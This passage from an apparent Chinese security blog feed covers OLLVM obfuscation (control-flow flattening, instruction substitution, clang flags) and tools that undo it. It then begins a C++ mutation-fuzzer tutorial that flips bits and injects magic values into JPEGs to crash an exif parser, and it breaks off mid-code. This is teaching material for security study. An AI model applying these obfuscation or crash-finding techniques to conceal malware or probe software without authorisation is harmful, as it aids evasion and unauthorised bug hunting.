</li><li>预处理器：跳转到主分发器</li></ul><p>例如一个程序源代码是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>平坦化后就会变成这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span>(b) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line">          b = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          b = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="混淆-1"><a href="#混淆-1" class="headerlink" title="混淆"></a>混淆</h2><p>实现流程</p><ul><li>添加一个随机数种子 blockID</li><li>保存所有的基本块</li><li>将代码中含有switch改为if</li><li>删除第一个基本块，第一个需要特殊处理</li><li>识别main中的if,并且删除跳转指令</li><li>插入一个switch指令</li><li>第一个块跳转到loopEntry块</li><li>把所有的block保存到switch语句</li><li>重新计算switch变量的值</li><li>处理不是条件跳转 直接删除jump 跳转到loopEnd 进行下一轮循环</li><li>处理条件跳转 对真分支和假分支进行相应处理 真则选择真的ID</li></ul><p>如果源代码含有switch, 那么先将里面含switch的改为if-else，再将所有的if-else变为Switch的结果，所以多次进行控制流平坦化就会变得越来越复杂</p><p>使用ollvm进行平坦化混淆</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -fla -mllvm -<span class="built_in">split</span> -mllvm -split_num=3 test.c -o fla</span><br></pre></td></tr></table></figure><ul><li><code>-mllvm -fla</code> : 激活控制流扁平化</li><li><code>-mllvm -split</code> : 激活基本块拆分。与激活时结合使用可提高扁平化效果。</li><li><code>-mllvm -split_num=3</code> : 如果激活此传递，则对每个基本块应用 3 次。默认：1</li></ul><p>对于我们的demo, 混淆结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_193753.png" alt=""></p><h2 id="反混淆-1"><a href="#反混淆-1" class="headerlink" title="反混淆"></a>反混淆</h2><p>反混淆最重要的肯定区分所有的基本快</p><ul><li>找到序言块，这是整个函数的入口</li><li>序言块的后继是主分发器</li><li>主分发器的前驱有两个，除了序言块外，另一个块就是预处理器 </li><li>预处理器的前驱是真实块 </li><li>除此之外的其他块是子分发器</li></ul><h3 id="d810-1"><a href="#d810-1" class="headerlink" title="d810"></a>d810</h3><p>d810同样支持去平坦化, 选择规则<code>default_unflatteing_ollvm</code>点击start, 然后再次编译即可</p><h3 id="模拟执行-1"><a href="#模拟执行-1" class="headerlink" title="模拟执行"></a>模拟执行</h3><p>工具<a href="[cq674350529/deflat: use angr to deobfuscation](https://github.com/cq674350529/deflat">deflat</a>)</p><h1 id="SUB-指令替换"><a href="#SUB-指令替换" class="headerlink" title="SUB(指令替换)"></a>SUB(指令替换)</h1><p>这种混淆技术的目标简单来说就是用功能等效但更复杂的指令序列来替换标准二进制运算符（如加法、减法或布尔运算符）。当有多个等效指令序列可供选择时，随机选择一个。</p><p>这种混淆方法相对简单，增加的安全性不多，因为它可以通过重新优化生成的代码轻松移除。然而，如果伪随机数生成器的种子值不同，指令替换会在生成的二进制文件中引入多样性。</p><p>目前只应用于整型, 如果是浮点数, 可能因为运算符的替换而导致舍入的误差和不必要的数值不精确</p><h2 id="混淆-2"><a href="#混淆-2" class="headerlink" title="混淆"></a>混淆</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -sub -mllvm -sub_loop=3 test.c -o sub</span><br></pre></td></tr></table></figure><ul><li><code>-mllvm -sub</code> : 激活指令替换</li><li><code>-mllvm -sub_loop=3</code>: 如果该 Pass 被激活，则对一个函数应用它 3 次。默认：1</li></ul><p>demo启用SUB后混淆效果如下</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_200159.png" alt=""></p><p>相对原本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">complex_calculation</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        result = a * b + (a ^ b);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = a + b * (a &amp; b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确实复杂了许多</p><h2 id="反混淆-2"><a href="#反混淆-2" class="headerlink" title="反混淆"></a>反混淆</h2><h3 id="d810-2"><a href="#d810-2" class="headerlink" title="d810"></a>d810</h3><p>又是神奇的d810</p><p>使用后可以看到少了许多</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_200421.png" alt=""></p><p>但依然还存在一些</p><h3 id="gooMBA"><a href="#gooMBA" class="headerlink" title="gooMBA"></a>gooMBA</h3><p>IDA自带的一个去混淆插件, 不过只能处理一些简单情况, 对ollvm产生的混淆效果并不太好</p><h3 id="GAMBA"><a href="#GAMBA" class="headerlink" title="GAMBA"></a>GAMBA</h3><p>同样是去混淆, 不过输入基于表达式</p><p><a href="https://github.com/HexRaysSA/goomba">HexRaysSA/goomba: gooMBA is a Hex-Rays Decompiler plugin to simplify Mixed Boolean-Arithmetic (MBA) expressions</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;llvm&quot;&gt;&lt;a href=&quot;#llvm&quot; class=&quot;headerlink&quot; title=&quot;llvm&quot;&gt;&lt;/a&gt;llvm&lt;/h1&gt;&lt;p&gt;llvm包括许多内容, 这里只粗略介绍&lt;/p&gt;
&lt;p&gt;LLVM(Low Level Virtual Machine)是苹果公</summary>
      
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="ollvm" scheme="https://ixout.github.io/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>code a baby fuzzer</title>
    <link href="https://ixout.github.io/posts/40120/"/>
    <id>https://ixout.github.io/posts/40120/</id>
    <published>2024-12-29T08:13:45.000Z</published>
    <updated>2025-01-07T14:29:46.574Z</updated>
    
    <content type="html"><![CDATA[<p>fuzzer应该是二进制安全学习者的必修项目,互联网上开源可供使用的fuzzer成百上千,专品精品应有尽有,但没什么比自己动手写一个fuzzer更好的学习方法了</p><p>这里跟随国外的<a href="https://h0mbre.github.io/">h0mbre</a>大佬的<code>caveman</code>系列从一个最简单的fuzzer开始动手</p><h1 id="A-Simple-Start"><a href="#A-Simple-Start" class="headerlink" title="A Simple Start"></a>A Simple Start</h1><p>从写一个宝宝级的fuzzer开始</p><h2 id="STEPⅠ"><a href="#STEPⅠ" class="headerlink" title="STEPⅠ"></a>STEPⅠ</h2><p>以一个exif格式分析程序为目标程序<a href="https://github.com/mkttanabe/exif">mkttanabe/exif: simple implementation to access the Exif segment in the JPEG file</a>切入我们的fuzzer分析</p><p>那么有必要稍微了解一下带exif的jpg格式规范</p><p>exif是一种为数码相机照片设定的档案格式,可以存储拍摄出照片的部分信息</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/PixPin_2024-12-29_16-46-17.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/PixPin_2024-12-29_16-48-07.png" alt=""></p><p>可以知道图片二进制格式中0xffxx一般是作为元标志使用,特别是</p><ul><li>0xFFD8代表图片的开始,位于二进制格式的最前方</li><li>0xFFD9代表图片的结束,二进制的末尾必须有一个该标志</li></ul><p>以该仓库下的照片作为样本<a href="https://github.com/ianare/exif-samples/tree/master/jpg">exif-samples/jpg at master · ianare/exif-samples</a></p><h2 id="STEP-Ⅱ"><a href="#STEP-Ⅱ" class="headerlink" title="STEP Ⅱ"></a>STEP Ⅱ</h2><p>代码部分<code>h0mbre</code>一开始采用的是较为方便调试与理解的python进行开发,并在后续改为c/c++等编译型语言以提升性能,这里就直接用cpp了</p><p>首先是最基础的io</p><p>从文件中读取二进制格式,使用一个vector<char\>来模拟可变字节流</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">GetData</span><span class="params">(std::string filename)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::ifstream <span class="title">file</span><span class="params">(filename, std::ios::binary | std::ios::ate)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Cannot open &quot;</span> &lt;&lt; filename &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  std::streamsize size = file.<span class="built_in">tellg</span>();</span><br><span class="line">  <span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">bytes</span><span class="params">(size)</span></span>;</span><br><span class="line"></span><br><span class="line">  file.<span class="built_in">seekg</span>(<span class="number">0</span>);</span><br><span class="line">  file.<span class="built_in">read</span>(bytes.<span class="built_in">data</span>(), size);</span><br><span class="line">  file.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写出文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BuildFile</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::ofstream <span class="title">file</span><span class="params">(<span class="string">&quot;mutated.jpg&quot;</span>, std::ios::binary | std::ios::trunc)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Cannot Create or Write to mutated.jpg&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    file.<span class="built_in">write</span>(data.<span class="built_in">data</span>(), data.<span class="built_in">size</span>());</span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Usage:baby_fuzzer [valid.jpg]&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::string filename = argv[<span class="number">1</span>];</span><br><span class="line">  std::vector&lt;<span class="type">char</span>&gt; origin_data = <span class="built_in">GetData</span>(filename);</span><br><span class="line">  <span class="built_in">BuildFile</span>(origin_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241229194628.png" alt=""></p><h2 id="STEP-Ⅲ"><a href="#STEP-Ⅲ" class="headerlink" title="STEP Ⅲ"></a>STEP Ⅲ</h2><p>接下来是变异功能,一种最简单的变异实现是位翻转</p><p>对于一个字节的数据,我们随机的对其一个bit位进行翻转,当然也可以翻转更多,甚至对每个字节的翻转位数也可以是随机的,不过暂时我们只翻转一个比特位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RandomGenerator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">SetRange</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> min, <span class="type">unsigned</span> <span class="type">int</span> max)</span> </span>&#123;</span><br><span class="line">    dist = std::<span class="built_in">uniform_int_distribution</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;(min, max);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title">GetRandomNum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dist</span>(gen);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">RandomGenerator</span>() = <span class="keyword">delete</span>;</span><br><span class="line">  <span class="type">static</span> std::random_device rd;</span><br><span class="line">  <span class="type">static</span> std::mt19937 gen;</span><br><span class="line">  <span class="type">static</span> std::uniform_int_distribution&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; dist;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::random_device RandomGenerator::rd;</span><br><span class="line"><span class="function">std::mt19937 <span class="title">RandomGenerator::gen</span><span class="params">(RandomGenerator::rd())</span></span>;</span><br><span class="line"><span class="function">std::uniform_int_distribution&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; <span class="title">RandomGenerator::dist</span><span class="params">(<span class="number">0</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BitFlip</span><span class="params">(std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num_to_flip = std::<span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;((data.<span class="built_in">size</span>() - <span class="number">4</span>) * <span class="number">0.01</span>));</span><br><span class="line">  std::vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; victim_indexs;</span><br><span class="line">  victim_indexs.<span class="built_in">reserve</span>(num_to_flip);</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">2</span>, data.<span class="built_in">size</span>() - <span class="number">3</span>);<span class="comment">//do not edit soi and eoi</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_to_flip; ++i) &#123;</span><br><span class="line">    victim_indexs.<span class="built_in">emplace_back</span>(RandomGenerator::<span class="built_in">GetRandomNum</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; i : victim_indexs) &#123;</span><br><span class="line">    <span class="type">int</span> bit_index = RandomGenerator::<span class="built_in">GetRandomNum</span>();</span><br><span class="line">    data[i] = data[i] ^ (<span class="number">1</span> &lt;&lt; bit_index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂定修改1%的字节数</p><p>位翻转其实还是在一个较小的范围内变化,完全随机字节也许不错</p><h2 id="STEP-Ⅳ"><a href="#STEP-Ⅳ" class="headerlink" title="STEP Ⅳ"></a>STEP Ⅳ</h2><p>我们已经完成了一个变异方法,现在我们需要测试他</p><p>首先是一个运行测试程序的接口,通过caveman后续系列的文章,我们可以知道fork出一个子进程并用execve函数启动目标程序,是优于使用popen函数的,因为popen会额外生成一个shell</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunTest</span><span class="params">(<span class="type">int</span> counter, <span class="type">const</span> std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">BuildFile</span>(<span class="string">&quot;mutated.jpg&quot;</span>, data);</span><br><span class="line">  <span class="type">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;fork failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">dup2</span>(fd, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(fd, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> args[] = &#123; <span class="string">&quot;./exif&quot;</span>, <span class="string">&quot;mutated.jpg&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="literal">nullptr</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">execve</span>(args[<span class="number">0</span>], args, <span class="literal">nullptr</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">      std::cerr &lt;&lt; <span class="string">&quot;execve failed: &quot;</span> &lt;&lt; errno &lt;&lt; std::endl;</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WIFSIGNALED</span>(status)) &#123;</span><br><span class="line">      std::cout &lt;&lt; <span class="string">&quot;Process terminated with signal: &quot;</span> &lt;&lt; <span class="built_in">WTERMSIG</span>(status) &lt;&lt; std::endl;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">WTERMSIG</span>(status) == SIGSEGV) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Segmentation Fault detected!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::ostringstream oss;</span><br><span class="line">        oss &lt;&lt; <span class="string">&quot;crashes/crash_&quot;</span> &lt;&lt; counter &lt;&lt; <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="built_in">BuildFile</span>(oss.<span class="built_in">str</span>(), data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应地修改main</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Usage:baby_fuzzer [valid.jpg]&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">CrashDirExists</span>();</span><br><span class="line">  std::string filename = argv[<span class="number">1</span>];</span><br><span class="line">  std::vector&lt;<span class="type">char</span>&gt; origin_data = <span class="built_in">GetData</span>(filename);</span><br><span class="line">  std::vector&lt;<span class="type">char</span>&gt; mutated_data;</span><br><span class="line">  <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (counter &lt; <span class="number">100</span>) &#123;</span><br><span class="line">    mutated_data = origin_data;</span><br><span class="line">    <span class="built_in">BitFlip</span>(mutated_data);</span><br><span class="line">    <span class="built_in">RunTest</span>(counter, mutated_data);</span><br><span class="line">    counter++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241229214119.png" alt=""></p><p>可以看到我们已经成功获得了crash,并且确实能够使得程序崩溃</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241229214835.png" alt=""></p><p>在之后我们可以进一步分析它</p><h2 id="STEP-Ⅴ"><a href="#STEP-Ⅴ" class="headerlink" title="STEP Ⅴ"></a>STEP Ⅴ</h2><p>现在继续增加另一种变异方法:特殊值注入</p><p>在计算机中存在这么一些值往往更容易触发意料之外的操作</p><p>例如</p><ul><li>0xFF</li><li>0x7F</li><li>0x00</li><li>0xFFFF</li><li>0x0000</li><li>0xFFFFFFFF</li><li>0x00000000</li><li>0x80000000</li><li>0x40000000</li><li>0x7FFFFFFF</li></ul><p>那么我们接下来就往数据中随机插入数个这样的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; gMagicNums[] = &#123;</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">0xff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">0x7f</span>&#125;,</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">2</span>, <span class="number">0xffff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">2</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0xffffffff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0x80000000</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0x7fffffff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0x40000000</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MagicOverwrite</span><span class="params">(std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num_to_over = std::<span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;((data.<span class="built_in">size</span>() - <span class="number">4</span>) * <span class="number">0.001</span>));</span><br><span class="line">  std::vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; victim_indexs;</span><br><span class="line">  victim_indexs.<span class="built_in">reserve</span>(num_to_over);</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">2</span>, data.<span class="built_in">size</span>() - <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_to_over; ++i) &#123;</span><br><span class="line">    victim_indexs.<span class="built_in">emplace_back</span>(RandomGenerator::<span class="built_in">GetRandomNum</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; i : victim_indexs) &#123;</span><br><span class="line">    <span class="type">int</span> magic_index = RandomGenerator::<span class="built_in">GetRandomNum</span>();</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;data[i], &amp;gMagicNums[magic_index].second, gMagicNums[magic_index].first);</span><br><span class="line">  &#125;</span><br><span 